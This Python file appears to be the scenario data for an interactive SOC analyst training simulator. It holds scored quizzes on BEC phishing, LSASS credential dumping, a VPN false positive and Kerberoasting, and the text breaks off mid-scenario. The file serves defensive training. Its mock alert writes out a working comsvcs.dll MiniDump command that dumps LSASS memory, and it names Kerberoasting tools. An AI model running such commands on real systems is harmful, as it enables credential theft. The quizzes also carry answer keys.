"""Interactive training simulation engine — realistic SOC scenarios with scoring.

Each scenario walks the analyst through a multi-step investigation with mock data,
requiring them to make decisions at each stage. Actions are scored against an
expected investigation path.
"""

import logging
from datetime import datetime, timezone
from typing import Any, Optional

logger = logging.getLogger(__name__)

# =====================================================================
# Scenario Definitions
# =====================================================================

SCENARIOS = {
    "phishing-ceo": {
        "id": "phishing-ceo",
        "title": "CEO Impersonation Phishing",
        "difficulty": "beginner",
        "role": "analyst",
        "estimated_minutes": 10,
        "description": "A suspicious email alert has fired. An email claiming to be from the CEO asks an employee to urgently transfer funds. Walk through triage, enrichment, and case creation.",
        "tags": ["phishing", "social-engineering", "email"],
        "alert": {
            "id": "SIM-ALERT-001",
            "title": "Suspicious Email: Wire Transfer Request from CEO",
            "severity": "high",
            "status": "open",
            "rule_name": "Email - CEO Impersonation Attempt",
            "source": "Email Gateway",
            "timestamp": "2026-04-07T08:23:15Z",
            "host": "MAIL-GW01",
            "user": "j.smith@guardedglass.com",
            "message": "Inbound email flagged: Subject 'URGENT: Wire Transfer Needed Today'. Sender claims to be CEO (ceo@guardedg1ass.com — note: misspelled domain with number 1). Recipient: j.smith@guardedglass.com (Finance dept).",
            "mitre_technique_id": "T1566.001",
            "mitre_technique_name": "Phishing: Spearphishing Attachment",
            "mitre_tactic_name": "initial-access",
            "raw_data": {
                "email.from": "ceo@guardedg1ass.com",
                "email.to": "j.smith@guardedglass.com",
                "email.subject": "URGENT: Wire Transfer Needed Today",
                "email.body_preview": "Hi James, I need you to process an urgent wire transfer of $47,500 to the account below. This is time-sensitive and confidential. Do not discuss with anyone else. Account: 4819-2773-0042, Routing: 021000021...",
                "email.sender_ip": "185.220.101.34",
                "email.reply_to": "ceo-urgent@protonmail.com",
                "email.has_attachment": False,
                "email.spf": "fail",
                "email.dkim": "fail",
                "email.dmarc": "fail",
                "email.x_originating_ip": "185.220.101.34",
            },
        },
        "observables": [
            {"value": "ceo@guardedg1ass.com", "type": "email", "context": "Sender address — note the '1' replacing 'l' in domain"},
            {"value": "guardedg1ass.com", "type": "domain", "context": "Lookalike domain registered 2 days ago"},
            {"value": "185.220.101.34", "type": "ip", "context": "Sender IP — known Tor exit node"},
            {"value": "ceo-urgent@protonmail.com", "type": "email", "context": "Reply-to address — anonymous email service"},
        ],
        "enrichment_results": {
            "guardedg1ass.com": {
                "source": "OpenCTI + WHOIS",
                "threat_level": "high",
                "details": "Domain registered 2 days ago via Namecheap. Registrant: privacy-protected. No historical records. Typosquat of guardedglass.com (Levenshtein distance: 1).",
                "verdict": "Malicious — newly registered lookalike domain",
            },
            "185.220.101.34": {
                "source": "OpenCTI + AbuseIPDB",
                "threat_level": "high",
                "details": "Known Tor exit node. Abuse confidence score: 94%. Reported 847 times. Associated with BEC (Business Email Compromise) campaigns.",
                "verdict": "Malicious — Tor exit node, BEC-associated",
            },
            "ceo-urgent@protonmail.com": {
                "source": "Internal lookup",
                "threat_level": "medium",
                "details": "Not a known company email. ProtonMail is a legitimate service but commonly used by threat actors for anonymity.",
                "verdict": "Suspicious — anonymous reply-to, not corporate",
            },
        },
        "threat_intel": {
            "actor": "BEC Campaign Cluster (Unnamed)",
            "confidence": 60,
            "ttps": ["T1566.001 - Spearphishing", "T1534 - Internal Spearphishing", "T1656 - Impersonation"],
            "context": "This pattern matches a known BEC campaign targeting finance departments. The Tor exit node has been linked to 3 similar incidents in the last month.",
        },
        "steps": [
            {
                "id": 1,
                "title": "Review Alert Details",
                "instruction": "Examine the alert carefully. What stands out about the sender address, email authentication, and content?",
                "type": "review",
                "hints": ["Check the sender domain spelling", "Look at SPF/DKIM/DMARC results", "Note the urgency and secrecy language"],
                "questions": [
                    {
                        "id": "q1",
                        "text": "What is suspicious about the sender domain?",
                        "type": "multiple_choice",
                        "options": [
                            {"id": "a", "text": "It uses a number '1' instead of letter 'l' (typosquat)", "correct": True, "feedback": "Correct! guardedg1ass.com vs guardedglass.com — classic typosquatting."},
                            {"id": "b", "text": "It's a free email provider", "correct": False, "feedback": "The sender domain is guardedg1ass.com, not a free provider. Look more carefully at the spelling."},
                            {"id": "c", "text": "It has no MX records", "correct": False, "feedback": "We don't have MX record data in this alert. Focus on what's visible."},
                            {"id": "d", "text": "Nothing suspicious", "correct": False, "feedback": "Compare guardedg1ass.com to the real guardedglass.com carefully — spot the difference."},
                        ],
                        "points": 10,
                    },
                    {
                        "id": "q2",
                        "text": "What do the SPF/DKIM/DMARC results tell you?",
                        "type": "multiple_choice",
                        "options": [
                            {"id": "a", "text": "All three failed — the email is not from a legitimate source", "correct": True, "feedback": "Correct! All authentication mechanisms failed, confirming the sender is spoofing or using an unauthorized domain."},
                            {"id": "b", "text": "They all passed — the email is legitimate", "correct": False, "feedback": "Check again — SPF, DKIM, and DMARC all show 'fail'."},
                            {"id": "c", "text": "Mixed results — inconclusive", "correct": False, "feedback": "All three failed, not mixed. This is a strong indicator of illegitimacy."},
                        ],
                        "points": 10,
                    },
                ],
            },
            {
                "id": 2,
                "title": "Extract & Enrich Observables",
                "instruction": "Identify the key IOCs from this alert and enrich them. Click each observable to see enrichment results.",
                "type": "enrich",
                "hints": ["Extract the sender domain, sender IP, and reply-to address", "Check each against threat intel sources"],
                "questions": [
                    {
                        "id": "q3",
                        "text": "After enriching 185.220.101.34, what is it?",
                        "type": "multiple_choice",
                        "options": [
                            {"id": "a", "text": "A Tor exit node linked to BEC campaigns", "correct": True, "feedback": "Correct! AbuseIPDB shows 847 reports and 94% abuse confidence. Linked to Business Email Compromise."},
                            {"id": "b", "text": "A legitimate mail server", "correct": False, "feedback": "This IP is a known Tor exit node with extremely high abuse scores."},
                            {"id": "c", "text": "A CDN endpoint", "correct": False, "feedback": "Check the enrichment data — this is flagged as a Tor exit node."},
                        ],
                        "points": 10,
                    },
                    {
                        "id": "q4",
                        "text": "How old is the domain guardedg1ass.com?",
                        "type": "multiple_choice",
                        "options": [
                            {"id": "a", "text": "2 days old", "correct": True, "feedback": "Correct! Newly registered domains used for impersonation are a major red flag."},
                            {"id": "b", "text": "2 years old", "correct": False, "feedback": "Check the WHOIS data — this domain was registered very recently."},
                            {"id": "c", "text": "Unknown", "correct": False, "feedback": "The enrichment data includes WHOIS registration date — check it."},
                        ],
                        "points": 10,
                    },
                ],
            },
            {
                "id": 3,
                "title": "Check Threat Intelligence",
                "instruction": "Review the threat intelligence context. Does this match any known campaigns or threat actors?",
                "type": "threat_intel",
                "hints": ["Look for pattern matches to known campaigns", "Check if the TTPs align with known actor behavior"],
                "questions": [
                    {
                        "id": "q5",
                        "text": "What type of attack is this most likely?",
                        "type": "multiple_choice",
                        "options": [
                            {"id": "a", "text": "Business Email Compromise (BEC)", "correct": True, "feedback": "Correct! CEO impersonation + wire transfer request + urgency/secrecy = classic BEC."},
                            {"id": "b", "text": "Ransomware delivery", "correct": False, "feedback": "There's no attachment or malware indicator. This is about social engineering for financial fraud."},
                            {"id": "c", "text": "Credential harvesting", "correct": False, "feedback": "No links to fake login pages. The goal here is direct financial transfer."},
                            {"id": "d", "text": "Spam / marketing", "correct": False, "feedback": "This is targeted at a specific employee with impersonation of the CEO. Far more sophisticated than spam."},
                        ],
                        "points": 15,
                    },
                ],
            },
            {
                "id": 4,
                "title": "Triage Decision",
                "instruction": "Based on your investigation, make a triage decision. Should this be escalated to a case?",
                "type": "decision",
                "hints": ["Consider: typosquat domain, all auth failures, Tor exit node, BEC pattern match", "What's the potential business impact of a $47,500 wire fraud?"],
                "questions": [
                    {
                        "id": "q6",
                        "text": "What is the correct triage action?",
                        "type": "multiple_choice",
                        "options": [
                            {"id": "a", "text": "Escalate to case — True Positive (BEC attempt)", "correct": True, "feedback": "Correct! This has all the hallmarks of a real BEC attack. A case should be created, the recipient contacted, and the domain blocked."},
                            {"id": "b", "text": "Close as False Positive", "correct": False, "feedback": "This is NOT a false positive. Every indicator — typosquat domain, failed auth, Tor IP, BEC pattern — confirms this is a real attack."},
                            {"id": "c", "text": "Close as Benign True Positive", "correct": False, "feedback": "This is not benign. A $47,500 wire fraud attempt targeting your finance department requires action."},
                            {"id": "d", "text": "Need more information", "correct": False, "feedback": "You have more than enough: typosquat domain (2 days old), all auth failures, Tor exit node, BEC threat intel match. Time to act."},
                        ],
                        "points": 20,
                    },
                ],
            },
            {
                "id": 5,
                "title": "Response Actions",
                "instruction": "You've escalated to a case. What immediate response actions should you take?",
                "type": "response",
                "hints": ["Think about containment, notification, and prevention"],
                "questions": [
                    {
                        "id": "q7",
                        "text": "Select ALL appropriate immediate actions:",
                        "type": "multi_select",
                        "options": [
                            {"id": "a", "text": "Block the domain guardedg1ass.com at the email gateway", "correct": True},
                            {"id": "b", "text": "Contact j.smith to confirm they did NOT send any wire transfer", "correct": True},
                            {"id": "c", "text": "Add 185.220.101.34 to the firewall blocklist", "correct": True},
                            {"id": "d", "text": "Notify the real CEO about the impersonation", "correct": True},
                            {"id": "e", "text": "Delete the email from j.smith's mailbox", "correct": True},
                            {"id": "f", "text": "Do nothing — the email gateway already blocked it", "correct": False},
                            {"id": "g", "text": "Reply to the attacker to gather more intel", "correct": False},
                        ],
                        "points": 25,
                        "feedback_correct": "Excellent! All containment actions selected. Block the domain, contact the recipient, block the IP, notify leadership, and quarantine the email.",
                        "feedback_partial": "Good start, but you missed some actions. In a BEC scenario, you need to contain (block domain/IP), verify (contact recipient), and notify (alert leadership).",
                    },
                ],
            },
        ],
    },

    "credential-dump": {
        "id": "credential-dump",
        "title": "Credential Dumping on Domain Controller",
        "difficulty": "intermediate",
        "role": "analyst",
        "estimated_minutes": 15,
        "description": "Multiple alerts have fired on a domain controller: LSASS memory access followed by suspicious network connections. Investigate a potential credential theft and lateral movement chain.",
        "tags": ["credential-access", "lateral-movement", "active-directory"],
        "alert": {
            "id": "SIM-ALERT-002",
            "title": "LSASS Memory Access by Non-System Process",
            "severity": "critical",
            "status": "open",
            "rule_name": "Credential Dumping - LSASS Access",
            "source": "Endpoint Detection",
            "timestamp": "2026-04-07T14:02:33Z",
            "host": "SRV-DC01",
            "user": "SYSTEM",
            "message": "Process rundll32.exe (PID 4872) accessed lsass.exe memory with PROCESS_VM_READ permission. Parent process: powershell.exe (PID 3104). Command line: rundll32.exe C:\\Windows\\Temp\\comsvcs.dll, MiniDump 632 C:\\Windows\\Temp\\lsass.dmp full",
            "mitre_technique_id": "T1003.001",
            "mitre_technique_name": "OS Credential Dumping: LSASS Memory",
            "mitre_tactic_name": "credential-access",
            "raw_data": {
                "process.name": "rundll32.exe",
                "process.pid": 4872,
                "process.parent.name": "powershell.exe",
                "process.parent.pid": 3104,
                "process.command_line": "rundll32.exe C:\\Windows\\Temp\\comsvcs.dll, MiniDump 632 C:\\Windows\\Temp\\lsass.dmp full",
                "file.path": "C:\\Windows\\Temp\\lsass.dmp",
                "host.name": "SRV-DC01",
                "host.os": "Windows Server 2022",
                "user.name": "SYSTEM",
                "event.action": "process_access",
                "event.category": "process",
            },
        },
        "related_alerts": [
            {
                "id": "SIM-ALERT-002b",
                "title": "Encoded PowerShell Command Execution",
                "severity": "high",
                "timestamp": "2026-04-07T14:01:45Z",
                "host": "SRV-DC01",
                "rule_name": "Suspicious PowerShell - Encoded Command",
                "mitre_technique_id": "T1059.001",
                "mitre_tactic_name": "execution",
                "message": "PowerShell launched with -EncodedCommand flag. Decoded content references comsvcs.dll MiniDump.",
            },
            {
                "id": "SIM-ALERT-002c",
                "title": "SMB Lateral Movement to File Server",
                "severity": "high",
                "timestamp": "2026-04-07T14:15:22Z",
                "host": "SRV-DC01",
                "rule_name": "Lateral Movement - SMB Admin Share Access",
                "mitre_technique_id": "T1021.002",
                "mitre_tactic_name": "lateral-movement",
                "message": "SRV-DC01 initiated SMB connection to \\\\SRV-FILE01\\C$ using domain admin credentials. 3 files copied to remote ADMIN$ share.",
            },
        ],
        "observables": [
            {"value": "SRV-DC01", "type": "host", "context": "Domain controller — source of credential dump"},
            {"value": "SRV-FILE01", "type": "host", "context": "File server — lateral movement target"},
            {"value": "C:\\Windows\\Temp\\lsass.dmp", "type": "file_path", "context": "LSASS memory dump output"},
            {"value": "comsvcs.dll", "type": "file", "context": "Living-off-the-land binary used for dump (LOLBin)"},
        ],
        "enrichment_results": {
            "SRV-DC01": {
                "source": "Asset Inventory",
                "threat_level": "critical",
                "details": "Primary Domain Controller. Windows Server 2022. Hosts AD DS, DNS, DHCP. 847 user accounts. Last patched 5 days ago.",
                "verdict": "Critical asset — any compromise here affects the entire domain",
            },
            "comsvcs.dll": {
                "source": "MITRE ATT&CK",
                "threat_level": "high",
                "details": "comsvcs.dll MiniDump is a well-known LOLBin technique (T1003.001). It abuses a legitimate Windows DLL to dump LSASS memory without dropping a known malicious binary. Used by APT29, APT41, Lazarus Group.",
                "verdict": "Known credential theft technique — not a false positive",
            },
        },
        "threat_intel": {
            "actor": "Multiple APT groups use this technique",
            "confidence": 85,
            "ttps": ["T1059.001 - PowerShell", "T1003.001 - LSASS Memory", "T1021.002 - SMB/Windows Admin Shares"],
            "context": "This is a classic post-exploitation credential theft chain: encoded PowerShell → LOLBin LSASS dump → lateral movement. The attacker already has SYSTEM-level access on the DC.",
        },
        "steps": [
            {
                "id": 1,
                "title": "Assess the Alert Severity",
                "instruction": "You see a critical alert on SRV-DC01. Examine the process details and command line.",
                "type": "review",
                "hints": ["This is a Domain Controller — the most sensitive server", "The command uses comsvcs.dll MiniDump — a known LOLBin technique"],
                "questions": [
                    {
                        "id": "q1",
                        "text": "What is rundll32.exe doing in this alert?",
                        "type": "multiple_choice",
                        "options": [
                            {"id": "a", "text": "Dumping LSASS process memory to steal credentials", "correct": True, "feedback": "Correct! The command 'rundll32.exe comsvcs.dll, MiniDump [LSASS PID] lsass.dmp full' creates a full memory dump of LSASS, which contains all cached credentials."},
                            {"id": "b", "text": "Running a legitimate Windows update", "correct": False, "feedback": "rundll32.exe with comsvcs.dll MiniDump targeting lsass.exe is NOT a Windows update. This is credential theft."},
                            {"id": "c", "text": "Performing a scheduled backup", "correct": False, "feedback": "Dumping lsass.exe memory to C:\\Windows\\Temp is not a backup operation. This is a well-known attack technique."},
                        ],
                        "points": 10,
                    },
                    {
                        "id": "q2",
                        "text": "Why is this alert CRITICAL severity?",
                        "type": "multiple_choice",
                        "options": [
                            {"id": "a", "text": "A Domain Controller's LSASS contains credentials for ALL domain users", "correct": True, "feedback": "Correct! LSASS on a DC caches credentials for every domain user who has authenticated. A dump here compromises the entire Active Directory domain."},
                            {"id": "b", "text": "Because rundll32.exe is a dangerous program", "correct": False, "feedback": "rundll32.exe itself is legitimate. The severity is because of WHERE it's running (DC) and WHAT it's accessing (LSASS = all domain credentials)."},
                            {"id": "c", "text": "All alerts from servers are critical", "correct": False, "feedback": "Not all server alerts are critical. This is critical because credential theft on a Domain Controller compromises the entire domain."},
                        ],
                        "points": 10,
                    },
                ],
            },
            {
                "id": 2,
                "title": "Check Related Alerts",
                "instruction": "ION found 2 related alerts on the same host. Review the attack chain timeline.",
                "type": "related",
                "hints": ["Look at the timestamps — what happened first?", "Map each alert to its MITRE tactic — do you see a kill chain?"],
                "questions": [
                    {
                        "id": "q3",
                        "text": "What is the attack sequence based on the 3 alerts?",
                        "type": "multiple_choice",
                        "options": [
                            {"id": "a", "text": "Encoded PowerShell (14:01) → LSASS dump (14:02) → SMB lateral movement (14:15)", "correct": True, "feedback": "Correct! The attacker used PowerShell to load the credential dumping tool, dumped LSASS, then used the stolen credentials to move laterally to SRV-FILE01 via SMB."},
                            {"id": "b", "text": "LSASS dump → PowerShell → lateral movement", "correct": False, "feedback": "Check the timestamps carefully. PowerShell execution came 48 seconds BEFORE the LSASS dump."},
                            {"id": "c", "text": "These alerts are unrelated", "correct": False, "feedback": "Same host, within 15 minutes, following a clear execution → credential-access → lateral-movement progression. These are definitely related."},
                        ],
                        "points": 15,
                    },
                ],
            },
            {
                "id": 3,
                "title": "Enrich & Investigate",
                "instruction": "Enrich the observables. Check what comsvcs.dll MiniDump means and assess the DC's criticality.",
                "type": "enrich",
                "hints": ["comsvcs.dll is a Living-off-the-Land Binary (LOLBin)", "Consider what a DC's LSASS memory contains"],
                "questions": [
                    {
                        "id": "q4",
                        "text": "What does the lateral movement to SRV-FILE01 tell you?",
                        "type": "multiple_choice",
                        "options": [
                            {"id": "a", "text": "The attacker has already extracted credentials and is using them to access other systems", "correct": True, "feedback": "Correct! The SMB connection to SRV-FILE01 using domain admin credentials confirms the LSASS dump was successful and the attacker has valid credentials."},
                            {"id": "b", "text": "SRV-FILE01 initiated the connection", "correct": False, "feedback": "The alert says SRV-DC01 initiated the SMB connection TO SRV-FILE01. The DC is the source."},
                            {"id": "c", "text": "This is normal DC replication traffic", "correct": False, "feedback": "AD replication uses different protocols and doesn't copy files to ADMIN$ shares. This is lateral movement."},
                        ],
                        "points": 15,
                    },
                ],
            },
            {
                "id": 4,
                "title": "Escalate & Respond",
                "instruction": "This is a confirmed active breach. Create a case and determine immediate response actions.",
                "type": "decision",
                "hints": ["The attacker has domain admin credentials", "They're actively moving through the network", "Speed matters"],
                "questions": [
                    {
                        "id": "q5",
                        "text": "What is the correct case severity?",
                        "type": "multiple_choice",
                        "options": [
                            {"id": "a", "text": "Critical — active domain compromise with lateral movement", "correct": True, "feedback": "Correct! Domain admin credentials stolen from a DC with confirmed lateral movement = Critical. This is an active breach."},
                            {"id": "b", "text": "High", "correct": False, "feedback": "This is beyond High. Domain Controller compromise with active lateral movement warrants Critical."},
                            {"id": "c", "text": "Medium", "correct": False, "feedback": "A DC compromise with stolen domain admin credentials and lateral movement is Critical, not Medium."},
                        ],
                        "points": 10,
                    },
                    {
                        "id": "q6",
                        "text": "Select ALL critical response actions:",
                        "type": "multi_select",
                        "options": [
                            {"id": "a", "text": "Isolate SRV-DC01 from the network (if possible without breaking AD)", "correct": True},
                            {"id": "b", "text": "Isolate SRV-FILE01 from the network", "correct": True},
                            {"id": "c", "text": "Force reset all domain admin passwords immediately", "correct": True},
                            {"id": "d", "text": "Enable enhanced logging on all DCs", "correct": True},
                            {"id": "e", "text": "Escalate to incident response team / management", "correct": True},
                            {"id": "f", "text": "Delete the lsass.dmp file and close the case", "correct": False},
                            {"id": "g", "text": "Wait 24 hours to see if more alerts appear", "correct": False},
                            {"id": "h", "text": "Reboot SRV-DC01 to clear the attacker's session", "correct": False},
                        ],
                        "points": 30,
                        "feedback_correct": "Perfect response! Isolate compromised systems, reset credentials, increase visibility, and escalate. Never just delete evidence or wait during an active breach.",
                        "feedback_partial": "You got some right, but missed critical actions. In an active DC compromise: isolate, reset ALL domain admin creds, increase logging, and immediately escalate. Never wait or just delete evidence.",
                    },
                ],
            },
        ],
    },

    "false-positive-vpn": {
        "id": "false-positive-vpn",
        "title": "Impossible Travel — VPN False Positive",
        "difficulty": "beginner",
        "role": "analyst",
        "estimated_minutes": 8,
        "description": "An impossible travel alert fired: a user logged in from London and New York within 10 minutes. But is it really impossible? Learn to identify and properly close false positives.",
        "tags": ["false-positive", "authentication", "VPN"],
        "alert": {
            "id": "SIM-ALERT-003",
            "title": "Impossible Travel: Login from 2 Locations within 10 minutes",
            "severity": "medium",
            "status": "open",
            "rule_name": "Impossible Travel Detection",
            "source": "Identity Protection",
            "timestamp": "2026-04-07T09:15:00Z",
            "host": None,
            "user": "m.wilson@guardedglass.com",
            "message": "User m.wilson logged in from London, UK (IP: 51.148.72.90) at 09:05 and from New York, US (IP: 198.51.100.42) at 09:15. Physical distance: 5,570 km. Time between logins: 10 minutes. Impossible at any speed of travel.",
            "mitre_technique_id": "T1078",
            "mitre_technique_name": "Valid Accounts",
            "mitre_tactic_name": "initial-access",
            "raw_data": {
                "login_1.ip": "51.148.72.90",
                "login_1.location": "London, UK",
                "login_1.time": "2026-04-07T09:05:00Z",
                "login_1.application": "Office 365",
                "login_1.user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0",
                "login_2.ip": "198.51.100.42",
                "login_2.location": "New York, US",
                "login_2.time": "2026-04-07T09:15:00Z",
                "login_2.application": "Office 365",
                "login_2.user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0",
                "user.department": "Engineering",
                "user.title": "Senior Developer",
                "user.vpn_assigned": True,
                "user.office_location": "London, UK",
            },
        },
        "observables": [
            {"value": "51.148.72.90", "type": "ip", "context": "Login source IP — London"},
            {"value": "198.51.100.42", "type": "ip", "context": "Login source IP — New York"},
            {"value": "m.wilson@guardedglass.com", "type": "email", "context": "User account"},
        ],
        "enrichment_results": {
            "51.148.72.90": {
                "source": "GeoIP + Internal",
                "threat_level": "low",
                "details": "UK-based ISP (BT Business). Located in London. This matches the user's office location. Clean reputation.",
                "verdict": "Benign — matches user's known office location",
            },
            "198.51.100.42": {
                "source": "GeoIP + Internal",
                "threat_level": "low",
                "details": "US-based corporate VPN exit node (Guarded Glass New York VPN cluster). Part of known VPN infrastructure. IP range 198.51.100.0/24 is allocated to corporate VPN.",
                "verdict": "Benign — corporate VPN exit node",
            },
        },
        "steps": [
            {
                "id": 1,
                "title": "Review the Alert",
                "instruction": "An impossible travel alert fired. Before assuming it's real, check the context clues.",
                "type": "review",
                "hints": ["Check the user's department and VPN assignment", "Look at the second IP's context"],
                "questions": [
                    {
                        "id": "q1",
                        "text": "What key detail in the raw data suggests this might be a false positive?",
                        "type": "multiple_choice",
                        "options": [
                            {"id": "a", "text": "The user has VPN assigned (vpn_assigned: true) and the second IP is a corporate VPN exit node", "correct": True, "feedback": "Correct! The user is VPN-enabled and 198.51.100.42 is a known Guarded Glass VPN exit node in New York. They're in London using VPN — not actually in New York."},
                            {"id": "b", "text": "The user agent strings are the same", "correct": False, "feedback": "Same user agents actually supports either explanation. The key clue is the VPN assignment and the second IP being a corporate VPN."},
                            {"id": "c", "text": "The severity is only medium", "correct": False, "feedback": "Severity doesn't determine FP/TP. Look at the data — specifically the VPN assignment and IP ownership."},
                        ],
                        "points": 15,
                    },
                ],
            },
            {
                "id": 2,
                "title": "Enrich the IPs",
                "instruction": "Enrich both IPs to confirm your hypothesis.",
                "type": "enrich",
                "hints": ["Check if either IP belongs to corporate infrastructure"],
                "questions": [
                    {
                        "id": "q2",
                        "text": "After enrichment, what is 198.51.100.42?",
                        "type": "multiple_choice",
                        "options": [
                            {"id": "a", "text": "A corporate VPN exit node in the Guarded Glass New York cluster", "correct": True, "feedback": "Correct! This is your own VPN infrastructure. The user connected to VPN from London, and their traffic exits in New York."},
                            {"id": "b", "text": "An attacker's proxy server", "correct": False, "feedback": "Check the enrichment — this IP is in the corporate VPN range 198.51.100.0/24."},
                            {"id": "c", "text": "A cloud hosting provider", "correct": False, "feedback": "The enrichment clearly identifies this as a Guarded Glass corporate VPN exit node."},
                        ],
                        "points": 10,
                    },
                ],
            },
            {
                "id": 3,
                "title": "Make the Triage Decision",
                "instruction": "You've confirmed the second IP is corporate VPN. What's the correct action?",
                "type": "decision",
                "hints": ["The user is physically in London, using VPN that exits in New York"],
                "questions": [
                    {
                        "id": "q3",
                        "text": "What is the correct closure?",
                        "type": "multiple_choice",
                        "options": [
                            {"id": "a", "text": "Close as False Positive — VPN split-tunnel causing geographic mismatch", "correct": True, "feedback": "Correct! This is a textbook VPN false positive. The user is in London but their VPN exits in New York, triggering the impossible travel rule. Document it clearly for rule tuning."},
                            {"id": "b", "text": "Escalate to case — could be credential theft", "correct": False, "feedback": "The evidence clearly shows this is VPN traffic. Both IPs are accounted for (office + corporate VPN). No need to escalate."},
                            {"id": "c", "text": "Close as True Positive", "correct": False, "feedback": "This IS a false positive. The impossible travel is explained by VPN usage, not actual dual-location access."},
                        ],
                        "points": 15,
                    },
                    {
                        "id": "q4",
                        "text": "What should you note when closing this FP?",
                        "type": "multiple_choice",
                        "options": [
                            {"id": "a", "text": "Recommend adding corporate VPN IP ranges to the impossible travel rule exclusion list", "correct": True, "feedback": "Excellent! This is exactly what Rule Tuning is for. By excluding known VPN exit IPs, you prevent this FP from recurring and reduce alert fatigue."},
                            {"id": "b", "text": "Just close it with no notes", "correct": False, "feedback": "Always document WHY something is FP. This helps with rule tuning and future analysts who see similar alerts."},
                            {"id": "c", "text": "Note that the user should stop using VPN", "correct": False, "feedback": "VPN usage is legitimate and encouraged. The rule needs tuning, not the user's behavior."},
                        ],
                        "points": 10,
                    },
                ],
            },
        ],
    },

    # =================================================================
    # AD / Windows Corporate Scenarios
    # =================================================================

    "kerberoasting": {
        "id": "kerberoasting",
        "title": "Kerberoasting Attack on Service Accounts",
        "difficulty": "intermediate",
        "role": "analyst",
        "estimated_minutes": 12,
        "description": "Anomalous Kerberos TGS requests detected from a workstation targeting multiple service accounts. Investigate a potential Kerberoasting attack aimed at offline password cracking.",
        "tags": ["active-directory", "kerberos", "credential-access", "windows"],
        "alert": {
            "id": "SIM-ALERT-004",
            "title": "Anomalous Kerberos TGS Requests — Multiple Service Accounts",
            "severity": "high",
            "status": "open",
            "rule_name": "Kerberoasting - Excessive TGS Requests",
            "source": "Domain Controller Audit",
            "timestamp": "2026-04-07T10:42:18Z",
            "host": "WS-DEV03",
            "user": "t.nguyen",
            "message": "Workstation WS-DEV03 (user t.nguyen) requested TGS tickets for 23 unique service accounts within 4 minutes using RC4 encryption (etype 0x17). Normal baseline for this user: 0-2 service ticket requests per hour. Targeted SPNs include MSSQL, HTTP, and CIFS service accounts.",
            "mitre_technique_id": "T1558.003",
            "mitre_technique_name": "Steal or Forge Kerberos Tickets: Kerberoasting",
            "mitre_tactic_name": "credential-access",
            "raw_data": {
                "event.code": "4769",
                "event.action": "Kerberos Service Ticket Operation",
                "source.ip": "10.20.5.103",
                "source.hostname": "WS-DEV03",
                "user.name": "t.nguyen",
                "user.domain": "GUARDEDGLASS",
                "winlog.event_data.TicketEncryptionType": "0x17",
                "winlog.event_data.TicketOptions": "0x40810000",
                "winlog.event_data.ServiceName_samples": "MSSQLSvc/SQL01.gg.local:1433, HTTP/intranet.gg.local, CIFS/FS01.gg.local, MSSQLSvc/SQL02.gg.local:1433, HTTP/sharepoint.gg.local",
                "tgs_request_count_4min": 23,
                "normal_baseline_hourly": "0-2",
                "encryption_type": "RC4_HMAC_MD5 (weak/legacy)",
            },
        },
        "observables": [
            {"value": "WS-DEV03", "type": "host", "context": "Source workstation — developer machine"},
            {"value": "10.20.5.103", "type": "ip", "context": "Source IP of TGS requests"},
            {"value": "t.nguyen", "type": "user", "context": "Account making the requests — developer role"},
            {"value": "MSSQLSvc/SQL01.gg.local:1433", "type": "spn", "context": "One of 23 targeted service principal names"},
        ],
        "enrichment_results": {
            "WS-DEV03": {
                "source": "Asset Inventory + EDR",
                "threat_level": "medium",
                "details": "Developer workstation. Windows 11 Pro. User: t.nguyen (Software Developer). EDR agent active. No prior alerts. Last patched 3 days ago. PowerShell execution logs show Rubeus.exe loaded into memory 6 minutes before the TGS requests.",
                "verdict": "Compromised — Rubeus (Kerberoasting tool) detected in memory",
            },
            "t.nguyen": {
                "source": "Active Directory + HR",
                "threat_level": "medium",
                "details": "Software Developer, Engineering team. AD member since 2024. No admin privileges. Member of: Domain Users, Developers, VPN-Users. No prior security incidents. Account not flagged as compromised. However: user's credentials may have been stolen, or the user is conducting unauthorized testing.",
                "verdict": "Account likely compromised — no legitimate reason for mass TGS requests",
            },
        },
        "threat_intel": {
            "actor": "Common post-exploitation technique",
            "confidence": 90,
            "ttps": ["T1558.003 - Kerberoasting", "T1059.001 - PowerShell", "T1069.002 - Domain Groups Discovery"],
            "context": "Kerberoasting is a standard Active Directory attack where an adversary requests TGS tickets for service accounts, then cracks them offline. RC4 encryption (etype 0x17) makes cracking trivial. Service accounts with weak passwords are the primary target. Tools: Rubeus, Invoke-Kerberoast, GetUserSPNs.py.",
        },
        "steps": [
            {
                "id": 1,
                "title": "Analyze the Kerberos Anomaly",
                "instruction": "23 TGS requests in 4 minutes targeting different service accounts. What does this pattern indicate?",
                "type": "review",
                "hints": ["Normal users don't request tickets for 23 different services", "RC4 encryption (etype 0x17) is the weak legacy type that attackers prefer"],
                "questions": [
                    {
                        "id": "q1",
                        "text": "Why is RC4 encryption (etype 0x17) significant in this alert?",
                        "type": "multiple_choice",
                        "options": [
                            {"id": "a", "text": "RC4 tickets are much faster to crack offline than AES — attackers specifically request RC4", "correct": True, "feedback": "Correct! Kerberoasting tools like Rubeus default to requesting RC4 because the hash can be cracked orders of magnitude faster than AES-256 tickets. This is a strong indicator of Kerberoasting."},
                            {"id": "b", "text": "RC4 is the newest and most secure encryption type", "correct": False, "feedback": "RC4 is actually the WEAKEST Kerberos encryption type. AES-256 is the modern standard. Attackers request RC4 specifically because it's easier to crack."},
                            {"id": "c", "text": "It indicates the domain controller is misconfigured", "correct": False, "feedback": "While the DC allowing RC4 is a hardening issue, the key point is that the ATTACKER is specifically requesting RC4 to make offline cracking easier."},
                        ],
                        "points": 10,
                    },
                    {
                        "id": "q2",
                        "text": "What is the attacker's goal with Kerberoasting?",
                        "type": "multiple_choice",
                        "options": [
                            {"id": "a", "text": "Extract service account TGS tickets and crack their passwords offline", "correct": True, "feedback": "Correct! The TGS tickets are encrypted with the service account's password hash. The attacker exports these tickets and uses hashcat/John to crack them, gaining the service account passwords — often highly privileged."},
                            {"id": "b", "text": "Perform a denial of service against the domain controller", "correct": False, "feedback": "Kerberoasting doesn't overload the DC. It's a stealthy credential theft technique — requesting tickets is normal Kerberos behavior, just the volume is unusual."},
                            {"id": "c", "text": "Gain direct access to the service accounts immediately", "correct": False, "feedback": "Kerberoasting doesn't give immediate access. The attacker needs to CRACK the tickets offline first, then use the recovered passwords."},
                        ],
                        "points": 10,
                    },
                ],
            },
            {
                "id": 2,
                "title": "Investigate the Source",
